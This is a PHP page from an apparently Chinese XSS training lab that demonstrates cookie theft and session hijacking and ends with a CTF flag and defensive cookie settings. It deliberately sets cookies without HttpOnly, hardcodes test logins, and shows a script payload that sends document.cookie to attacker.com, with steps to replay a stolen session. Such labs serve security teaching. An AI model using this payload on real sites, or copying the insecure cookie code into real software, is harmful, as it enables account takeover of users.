<?php
// Cookie窃取伪造登录漏洞演示
session_start();

// 模拟用户数据库
$users = [
    'admin' => ['pass' => 'admin123', 'role' => 'admin'],
    'user' => ['pass' => 'user123', 'role' => 'user'],
];

$error = '';

// 处理登录
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['username'], $_POST['password'])) {
    $username = $_POST['username'];
    $password = $_POST['password'];
    
    if (isset($users[$username]) && $users[$username]['pass'] === $password) {
        $_SESSION['logged_in'] = true;
        $_SESSION['username'] = $username;
        $_SESSION['role'] = $users[$username]['role'];
        
        // 设置易受攻击的Cookie（没有HttpOnly）
        setcookie('session_id', session_id(), time() + 3600, '/', '', false, false);
        setcookie('username', $username, time() + 3600, '/', '', false, false);
        setcookie('role', $users[$username]['role'], time() + 3600, '/', '', false, false);
        
        header('Location: 05_cookie_steal.php');
        exit;
    } else {
        $error = '用户名或密码错误';
    }
}

// 处理退出
if (isset($_GET['logout'])) {
    session_destroy();
    setcookie('session_id', '', time() - 3600, '/');
    setcookie('username', '', time() - 3600, '/');
    setcookie('role', '', time() - 3600, '/');
    header('Location: 05_cookie_steal.php');
    exit;
}

$is_logged_in = isset($_SESSION['logged_in']) && $_SESSION['logged_in'];
$current_user = $_SESSION['username'] ?? '';
$current_role = $_SESSION['role'] ?? '';
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cookie窃取伪造登录 - XSS攻击</title>
    <link rel="stylesheet" href="../assets/css/style.css">
    <style>
        body {
            background: linear-gradient(135deg, #11998e 0%, #38ef7d 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 950px;
            margin: 30px auto;
        }
        .card {
            background: white;
            border-radius: 20px;
            padding: 35px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            margin-bottom: 25px;
        }
        .card h2 {
            color: #333;
            margin-bottom: 20px;
        }
        .alert-danger {
            background: linear-gradient(135deg, #ff6b6b 0%, #ee5a6f 100%);
            color: white;
            padding: 20px;
            border-radius: 12px;
            margin-bottom: 25px;
        }
        .alert-success {
            background: linear-gradient(135deg, #11998e 0%, #38ef7d 100%);
            color: white;
            padding: 20px;
            border-radius: 12px;
            margin-bottom: 25px;
        }
        .info-section {
            background: #d4edda;
            border-left: 5px solid #28a745;
            padding: 20px;
            border-radius: 0 10px 10px 0;
            margin-bottom: 25px;
        }
        .login-form, .steal-demo {
            background: #f8f9fa;
            padding: 25px;
            border-radius: 15px;
            margin: 20px 0;
        }
        .form-group {
            margin-bottom: 15px;
        }
        .form-group label {
            display: block;
            margin-bottom: 8px;
            color: #555;
            font-weight: 500;
        }
        .form-group input {
            width: 100%;
            padding: 12px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-size: 16px;
        }
        .btn {
            padding: 12px 30px;
            background: linear-gradient(135deg, #11998e 0%, #38ef7d 100%);
            color: white;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-weight: 600;
        }
        .btn-danger {
            background: linear-gradient(135deg, #ff6b6b 0%, #ee5a6f 100%);
        }
        .code-block {
            background: #1e1e1e;
            color: #d4d4d4;
            padding: 20px;
            border-radius: 10px;
            font-family: 'Courier New', monospace;
            font-size: 13px;
            overflow-x: auto;
            margin: 15px 0;
        }
        .cookie-display {
            background: #fff3cd;
            padding: 15px;
            border-radius: 8px;
            font-family: 'Courier New', monospace;
            font-size: 13px;
            word-break: break-all;
            margin: 10px 0;
        }
        .xss-payload {
            background: #f8d7da;
            border: 2px solid #f5c6cb;
            padding: 15px;
            border-radius: 8px;
            margin: 15px 0;
        }
        .steal-result {
            background: #1e1e1e;
            color: #7ee787;
            padding: 20px;
            border-radius: 10px;
            font-family: 'Courier New', monospace;
            min-height: 100px;
            margin-top: 15px;
        }
        .back-link {
            display: inline-block;
            margin-top: 20px;
            color: #11998e;
            text-decoration: none;
            font-weight: 600;
        }
        .flag-box {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            color: white;
            padding: 25px;
            border-radius: 15px;
            text-align: center;
            margin: 20px 0;
            font-family: 'Courier New', monospace;
            display: none;
        }
        .flag-box.show {
            display: block;
        }
        .admin-panel {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 20px;
            border-radius: 10px;
            margin-top: 15px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <div class="alert-danger">
                <h4>🚨 Cookie窃取与伪造登录</h4>
                <p>本场景演示如何通过XSS窃取用户Cookie，并利用窃取的Cookie伪造登录。</p>
            </div>
            
            <h2>5. 🍪 Cookie窃取伪造登录</h2>
            
            <div class="info-section">
                <strong>💡 漏洞说明：</strong><br>
                当Cookie没有设置HttpOnly属性时，JavaScript可以读取document.cookie。<br>
                攻击者通过XSS将Cookie发送到远程服务器，然后使用窃取的Cookie冒充用户登录。<br>
                <br>
                <strong>危害：</strong>完全接管用户会话，无需知道密码即可登录
            </div>
        </div>

        <?php if (!$is_logged_in): ?>
        <div class="card">
            <h3>🔑 用户登录</h3>
            <div class="login-form">
                <?php if ($error): ?>
                    <div style="color: #e74c3c; margin-bottom: 15px;"><?php echo $error; ?></div>
                <?php endif; ?>
                <form method="POST">
                    <div class="form-group">
                        <label>用户名</label>
                        <input type="text" name="username" placeholder="admin 或 user" required>
                    </div>
                    <div class="form-group">
                        <label>密码</label>
                        <input type="password" name="password" placeholder="admin123 / user123" required>
                    </div>
                    <button type="submit" class="btn">登录</button>
                </form>
                <p style="margin-top: 15px; color: #666; font-size: 14px;">
                    测试账号：admin/admin123 (管理员) 或 user/user123 (普通用户)
                </p>
            </div>
        </div>
        <?php else: ?>
        <div class="card">
            <div class="alert-success">
                <h4>✅ 登录成功</h4>
                <p>欢迎，<?php echo htmlspecialchars($current_user); ?>！角色：<?php echo htmlspecialchars($current_role); ?></p>
            </div>
            
            <h3>🍪 你的Cookie（没有HttpOnly保护）</h3>
            <div class="cookie-display" id="cookieDisplay">
                加载中...
            </div>
            
            <div class="xss-payload">
                <h4>⚠️ XSS窃取Payload</h4>
                <p>如果在其他页面注入以下代码，你的Cookie将被窃取：</p>
                <div class="code-block">&lt;script&gt;
  fetch('http://attacker.com/steal?cookie=' + encodeURIComponent(document.cookie));
&lt;/script&gt;</div>
            </div>
            
            <?php if ($current_role === 'admin'): ?>
            <div class="admin-panel">
                <h4>👑 管理员专属区域</h4>
                <p>只有管理员能看到此内容</p>
            </div>
            <?php endif; ?>
            
            <a href="?logout=1" class="btn btn-danger" style="text-decoration: none; display: inline-block; margin-top: 15px;">退出登录</a>
        </div>
        <?php endif; ?>

        <div class="card">
            <h3>🎯 Cookie窃取演示</h3>
            <div class="steal-demo">
                <h4>步骤1：模拟XSS攻击</h4>
                <p>点击下面按钮模拟XSS窃取Cookie：</p>
                <button class="btn" onclick="stealCookie()">🕵️ 模拟窃取Cookie</button>
                
                <h4 style="margin-top: 20px;">步骤2：查看窃取的Cookie</h4>
                <div class="steal-result" id="stolenCookies">
// 窃取的Cookie将显示在这里
// 格式: cookie_name=cookie_value
                </div>
                
                <h4 style="margin-top: 20px;">步骤3：使用窃取的Cookie登录</h4>
                <p>复制上面窃取的session_id，在控制台执行：</p>
                <div class="code-block">// 设置窃取的Cookie
document.cookie = 'session_id=窃取的值; path=/';
location.reload();</div>
                <button class="btn" onclick="simulateHijack()">🎭 一键模拟会话劫持</button>
            </div>
            
            <div id="flagBox" class="flag-box">
                🚩 FLAG{Cookie_Theft_Session_Hijacking}<br>
                <span style="font-size: 0.9rem;">你成功窃取了Cookie并完成了会话劫持！</span>
            </div>
        </div>

        <div class="card">
            <h3>🛡️ 防御方法</h3>
            <div class="info-section">
                1. <strong>HttpOnly Cookie：</strong>设置Cookie时添加HttpOnly属性，禁止JavaScript访问<br>
                2. <strong>Secure属性：</strong>只在HTTPS连接中传输Cookie<br>
                3. <strong>SameSite属性：</strong>限制第三方网站发送Cookie<br>
                4. <strong>会话管理：</strong>定期更换Session ID，检测异常登录<br>
                5. <strong>XSS防护：</strong>从根本上防止XSS漏洞
            </div>
            
            <div class="code-block">// 安全的Cookie设置（PHP）
setcookie('session_id', $value, [
    'expires' => time() + 3600,
    'path' => '/',
    'secure' => true,      // 只在HTTPS传输
    'httponly' => true,    // 禁止JS访问
    'samesite' => 'Strict' // 限制跨站发送
]);</div>
            
            <a href="index.php" class="back-link">← 返回XSS模块首页</a>
        </div>
    </div>

    <script>
        // 显示当前Cookie
        function displayCookies() {
            const cookieDisplay = document.getElementById('cookieDisplay');
            if (cookieDisplay) {
                const cookies = document.cookie;
                cookieDisplay.textContent = cookies || '没有可读取的Cookie（可能是HttpOnly保护）';
            }
        }
        
        // 模拟窃取Cookie
        function stealCookie() {
            const cookies = document.cookie;
            const stolenDisplay = document.getElementById('stolenCookies');
            
            if (!cookies) {
                stolenDisplay.textContent = '// 没有可窃取的Cookie\n// 提示：请先登录获取Cookie';
                return;
            }
            
            // 模拟发送到攻击者服务器
            const timestamp = new Date().toISOString();
            stolenDisplay.innerHTML = `// [${timestamp}] 成功窃取Cookie！
// 目标: ${window.location.host}
// 用户IP: 192.168.1.100 (模拟)

${cookies}

// 攻击者可以使用这些Cookie冒充用户登录！`;
            
            // 显示FLAG
            document.getElementById('flagBox').classList.add('show');
            
            // 保存到localStorage用于后续演示
            localStorage.setItem('stolen_session_id', getCookieValue('session_id'));
            localStorage.setItem('stolen_username', getCookieValue('username'));
            localStorage.setItem('stolen_role', getCookieValue('role'));
        }
        
        // 获取指定Cookie值
        function getCookieValue(name) {
            const value = `; ${document.cookie}`;
            const parts = value.split(`; ${name}=`);
            if (parts.length === 2) return parts.pop().split(';').shift();
            return '';
        }
        
        // 模拟会话劫持
        function simulateHijack() {
            const stolenSession = localStorage.getItem('stolen_session_id');
            if (!stolenSession) {
                alert('请先窃取Cookie！');
                return;
            }
            
            // 设置窃取的Cookie
            document.cookie = `session_id=${stolenSession}; path=/`;
            document.cookie = `username=${localStorage.getItem('stolen_username')}; path=/`;
            document.cookie = `role=${localStorage.getItem('stolen_role')}; path=/`;
            
            alert('已使用窃取的Cookie！页面将刷新...');
            location.reload();
        }
        
        // 页面加载时显示Cookie
        window.onload = function() {
            displayCookies();
        };
    </script>
</body>
</html>
